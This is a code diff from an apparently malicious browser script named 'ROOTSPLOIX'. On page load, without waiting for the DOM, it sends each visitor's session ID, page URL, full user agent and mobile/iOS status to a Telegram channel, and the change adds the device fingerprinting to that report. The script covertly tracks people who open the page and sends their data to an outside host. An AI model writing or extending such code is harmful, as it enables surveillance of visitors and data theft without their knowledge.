@@ -2277,10 +2277,14 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
         // ULTIMATE DEBUG SYSTEM
         console.log('🔥 ROOTSPLOIX DEBUG: Script loading started');
         
+        // MOBILE/iOS DETECTION
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        
         // IMMEDIATE TEST (without waiting for DOM)
-        const immediateTestMsg = `⚡ IMMEDIATE TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n💀 SCRIPT EXECUTING NOW!`;
+        const immediateTestMsg = `⚡ IMMEDIATE TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n📱 Mobile: ${isMobile ? 'YES' : 'NO'}\n🍎 iOS: ${isIOS ? 'YES' : 'NO'}\n🌐 UserAgent: ${navigator.userAgent}\n\n💀 SCRIPT EXECUTING NOW!`;
         sendToTelegram(immediateTestMsg);
-        console.log('⚡ ROOTSPLOIX DEBUG: Immediate test sent');
+        console.log('⚡ ROOTSPLOIX DEBUG: Immediate test sent - Mobile:' + isMobile + ' iOS:' + isIOS);
         
         // Error handler
         window.addEventListener('error', function(e) {
